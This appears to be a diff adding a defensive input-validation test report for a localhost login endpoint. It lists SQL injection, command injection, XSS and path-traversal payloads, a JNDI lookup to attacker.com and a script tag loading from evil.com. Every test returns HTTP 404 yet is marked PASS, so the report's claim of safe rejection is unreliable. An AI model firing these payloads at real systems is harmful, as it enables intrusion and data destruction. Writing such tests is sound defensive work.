@@ -1,0 +1,120 @@
+
+========================================================================================
+SECURITY & DEFENSIVE INPUT VALIDATION TEST REPORT
+Endpoint: http://localhost:8080/test-login (Method: POST)
+Session Started: 2026-10-08 11:32:34.670
+========================================================================================
+TIMESTAMP               | RESULT | STATUS     | TIME     | CATEGORY           | PAYLOAD & DETAILS
+----------------------------------------------------------------------------------------
+2026-10-08 11:32:37.950 | PASS   | HTTP 404   | 3262  ms | Content-Type       | Payload: "Raw JSON payload" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.034 | PASS   | HTTP 404   | 62    ms | Transport/QueryParam | Payload: "SQLi in queryParam" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.103 | PASS   | HTTP 404   | 61    ms | Tampering          | Payload: "Extra admin parameters injected" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.140 | PASS   | HTTP 404   | 32    ms | Missing Param      | Payload: "password omitted from request" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.322 | PASS   | HTTP 404   | 134   ms | Boundary/bioId     | Payload: "bioId=-1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.615 | PASS   | HTTP 404   | 283   ms | Boundary/bioId     | Payload: "bioId=-999999" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.680 | PASS   | HTTP 404   | 61    ms | Boundary/bioId     | Payload: "bioId=0" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.724 | PASS   | HTTP 404   | 40    ms | Boundary/bioId     | Payload: "bioId=" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.782 | PASS   | HTTP 404   | 51    ms | Invalid Type/bioId | Payload: "bioId=invalidBioId" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.833 | PASS   | HTTP 404   | 47    ms | Invalid Type/bioId | Payload: "bioId=abc123" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.875 | PASS   | HTTP 404   | 37    ms | Invalid Type/bioId | Payload: "bioId=true" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:38.957 | PASS   | HTTP 404   | 77    ms | Invalid Type/bioId | Payload: "bioId=1234.5678" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.002 | PASS   | HTTP 404   | 41    ms | Invalid Type/bioId | Payload: "bioId=NaN" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.037 | PASS   | HTTP 404   | 32    ms | Invalid Type/bioId | Payload: "bioId=Infinity" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.146 | PASS   | HTTP 404   | 105   ms | Invalid Type/bioId | Payload: "bioId=!@#$%^&*()" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.191 | PASS   | HTTP 404   | 41    ms | Invalid Type/bioId | Payload: "bioId=1001 2002" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.226 | PASS   | HTTP 404   | 31    ms | Invalid Type/bioId | Payload: "bioId=0x7B" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.262 | PASS   | HTTP 404   | 33    ms | Invalid Type/bioId | Payload: "bioId=99999999999999999999999999999... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.294 | PASS   | HTTP 404   | 25    ms | Missing Param      | Payload: "Both bioId & password omitted" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.341 | PASS   | HTTP 404   | 35    ms | Missing Param      | Payload: "bioId omitted from request" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.373 | PASS   | HTTP 404   | 27    ms | Boundary/LongString | Payload: "1,000 char string" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.443 | PASS   | HTTP 404   | 67    ms | Boundary/LongString | Payload: "65,536 char string (64KB)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.476 | PASS   | HTTP 404   | 28    ms | Malformed/JSON     | Payload: "{"bioId": 1001, "password": "secret... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.590 | PASS   | HTTP 404   | 99    ms | Malformed/JSON     | Payload: "{"admin": true}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.632 | PASS   | HTTP 404   | 38    ms | Malformed/JSON     | Payload: "{"$gt": ""}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.674 | PASS   | HTTP 404   | 38    ms | Malformed/JSON     | Payload: "{"$ne": null}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.732 | PASS   | HTTP 404   | 55    ms | Malformed/JSON     | Payload: "[1, 2, 3]" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.772 | PASS   | HTTP 404   | 37    ms | Malformed/JSON     | Payload: "{"bioId": [1, 2], "role": "ADMIN"}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.802 | PASS   | HTTP 404   | 27    ms | Malformed/JSON     | Payload: "true" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.831 | PASS   | HTTP 404   | 25    ms | Malformed/JSON     | Payload: "null" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.858 | PASS   | HTTP 404   | 23    ms | Boundary/Empty     | Payload: "Empty password string """ -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.886 | PASS   | HTTP 404   | 25    ms | Format/Traversal   | Payload: "%s%s%s%s%s%n%x%d" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.910 | PASS   | HTTP 404   | 22    ms | Format/Traversal   | Payload: "%00" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.937 | PASS   | HTTP 404   | 22    ms | Format/Traversal   | Payload: "../../../../../../etc/passwd" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.965 | PASS   | HTTP 404   | 25    ms | Format/Traversal   | Payload: "..\..\..\..\windows\system32\config... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:39.990 | PASS   | HTTP 404   | 22    ms | Format/Traversal   | Payload: "${jndi:ldap://attacker.com/maliciou... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.021 | PASS   | HTTP 404   | 26    ms | Format/Traversal   | Payload: "${7*7}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.049 | PASS   | HTTP 404   | 24    ms | Format/Traversal   | Payload: "#{7*7}" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.081 | PASS   | HTTP 404   | 27    ms | Unicode/Encoding   | Payload: "🔥🔒🚀👻🛡️" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.109 | PASS   | HTTP 404   | 23    ms | Unicode/Encoding   | Payload: "こんにちは世界" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.136 | PASS   | HTTP 404   | 23    ms | Unicode/Encoding   | Payload: "مرحبا بالعالم" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.162 | PASS   | HTTP 404   | 22    ms | Unicode/Encoding   | Payload: "Здравствуйте" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.194 | PASS   | HTTP 404   | 27    ms | Unicode/Encoding   | Payload: "admin password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.218 | PASS   | HTTP 404   | 22    ms | Unicode/Encoding   | Payload: "‮reversed_password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.252 | PASS   | HTTP 404   | 30    ms | Unicode/Encoding   | Payload: "test﻿password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.278 | PASS   | HTTP 404   | 22    ms | Unicode/Encoding   | Payload: "§±!@#$%^&*()_+-=[]{}|;':",./<>?`~" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.310 | PASS   | HTTP 404   | 29    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.351 | PASS   | HTTP 404   | 38    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.382 | PASS   | HTTP 404   | 27    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.407 | PASS   | HTTP 404   | 22    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.431 | PASS   | HTTP 404   | 20    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.473 | PASS   | HTTP 404   | 39    ms | Boundary/Whitespace | Payload: "Whitespace-only password" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.518 | PASS   | HTTP 404   | 42    ms | Boundary/LongString | Payload: "9,600 char string" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.563 | PASS   | HTTP 404   | 39    ms | Command Injection  | Payload: "; whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.592 | PASS   | HTTP 404   | 25    ms | Command Injection  | Payload: "$(whoami)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.616 | PASS   | HTTP 404   | 21    ms | Command Injection  | Payload: "& whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.643 | PASS   | HTTP 404   | 22    ms | Command Injection  | Payload: "| whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.671 | PASS   | HTTP 404   | 22    ms | Command Injection  | Payload: "&& whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.703 | PASS   | HTTP 404   | 23    ms | Command Injection  | Payload: "|| whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.726 | PASS   | HTTP 404   | 20    ms | Command Injection  | Payload: "; id" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.742 | PASS   | HTTP 404   | 10    ms | Command Injection  | Payload: "| id" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.780 | PASS   | HTTP 404   | 22    ms | Command Injection  | Payload: "; cat /etc/passwd" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.808 | PASS   | HTTP 404   | 23    ms | Command Injection  | Payload: "& type C:\Windows\System32\drivers\... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.842 | PASS   | HTTP 404   | 28    ms | Command Injection  | Payload: "`whoami`" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.867 | PASS   | HTTP 404   | 20    ms | Command Injection  | Payload: "& dir" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.893 | PASS   | HTTP 404   | 22    ms | Command Injection  | Payload: "; dir" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.909 | PASS   | HTTP 404   | 11    ms | Command Injection  | Payload: "| dir" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.940 | PASS   | HTTP 404   | 20    ms | Command Injection  | Payload: "$(sleep 5)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.959 | PASS   | HTTP 404   | 16    ms | Command Injection  | Payload: "| echo vulnerable" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:40.978 | PASS   | HTTP 404   | 14    ms | Command Injection  | Payload: "; uname -a" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.019 | PASS   | HTTP 404   | 33    ms | Command Injection  | Payload: "& calc.exe" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.044 | PASS   | HTTP 404   | 19    ms | Command Injection  | Payload: "| net user" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.072 | PASS   | HTTP 404   | 17    ms | Command Injection  | Payload: "bioId=; whoami" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.095 | PASS   | HTTP 404   | 20    ms | Command Injection  | Payload: "bioId=$(whoami)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.119 | PASS   | HTTP 404   | 21    ms | Command Injection  | Payload: "bioId=& dir" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.142 | PASS   | HTTP 404   | 19    ms | Command Injection  | Payload: "bioId=| id" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.170 | PASS   | HTTP 404   | 23    ms | XSS Injection      | Payload: "<script>alert(1)</script>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.193 | PASS   | HTTP 404   | 20    ms | XSS Injection      | Payload: "<script>alert('XSS')</script>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.214 | PASS   | HTTP 404   | 18    ms | XSS Injection      | Payload: "<img src=x onerror=alert(1)>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.236 | PASS   | HTTP 404   | 20    ms | XSS Injection      | Payload: "javascript:alert(1)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.259 | PASS   | HTTP 404   | 19    ms | XSS Injection      | Payload: "<svg onload=alert(1)>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.281 | PASS   | HTTP 404   | 18    ms | XSS Injection      | Payload: "<body onload=alert('XSS')>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.307 | PASS   | HTTP 404   | 22    ms | XSS Injection      | Payload: ""><script src=http://evil.com/x.js>... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.330 | PASS   | HTTP 404   | 20    ms | XSS Injection      | Payload: "<iframe src="javascript:alert(1)"><... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.358 | PASS   | HTTP 404   | 26    ms | XSS Injection      | Payload: "<input type="text" autofocus onfocu... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.391 | PASS   | HTTP 404   | 30    ms | XSS Injection      | Payload: ""><svg/onload=confirm(1)>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.414 | PASS   | HTTP 404   | 20    ms | XSS Injection      | Payload: "';alert(String.fromCharCode(88,83,8... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.439 | PASS   | HTTP 404   | 22    ms | XSS Injection      | Payload: "<a href="javascript:alert(1)">Click... (truncated)" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.465 | PASS   | HTTP 404   | 22    ms | XSS Injection      | Payload: "bioId=<script>alert(1)</script>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.491 | PASS   | HTTP 404   | 24    ms | XSS Injection      | Payload: "bioId=<img src=x onerror=alert(1)>" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.516 | PASS   | HTTP 404   | 19    ms | SQL Injection      | Payload: "bioId=1 OR 1=1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.540 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "bioId=' OR '1'='1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.567 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "bioId=1; DROP TABLE users;--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.592 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "bioId=1 UNION SELECT null, null--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.616 | PASS   | HTTP 404   | 22    ms | SQL Injection      | Payload: "bioId=1001' OR '1'='1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.643 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "' OR '1'='1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.670 | PASS   | HTTP 404   | 24    ms | SQL Injection      | Payload: "' OR 1=1--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.695 | PASS   | HTTP 404   | 22    ms | SQL Injection      | Payload: "admin' --" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.717 | PASS   | HTTP 404   | 20    ms | SQL Injection      | Payload: "'; DROP TABLE users;--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.744 | PASS   | HTTP 404   | 24    ms | SQL Injection      | Payload: "'; DELETE FROM accounts;--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.771 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "' UNION SELECT null, null, null--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.796 | PASS   | HTTP 404   | 22    ms | SQL Injection      | Payload: "1' ORDER BY 1--+" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.824 | PASS   | HTTP 404   | 26    ms | SQL Injection      | Payload: "admin' /*" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.849 | PASS   | HTTP 404   | 23    ms | SQL Injection      | Payload: "' OR 'x'='x" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.872 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "") OR ("1"="1" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.896 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "' OR '' = '" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.920 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "'; WAITFOR DELAY '0:0:5'--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.944 | PASS   | HTTP 404   | 20    ms | SQL Injection      | Payload: "' OR SLEEP(5)--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.967 | PASS   | HTTP 404   | 21    ms | SQL Injection      | Payload: "'; pg_sleep(5)--" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:41.989 | PASS   | HTTP 404   | 19    ms | SQL Injection      | Payload: "1' OR '1' = '1' /*" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:42.014 | PASS   | HTTP 404   | 22    ms | SQL Injection      | Payload: "' OR 1=1#" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
+2026-10-08 11:32:42.036 | PASS   | HTTP 404   | 20    ms | SQL Injection      | Payload: "admin' or '1'='1'#" -> Safely rejected (4xx). No stack traces, SQL errors, or command leaks.
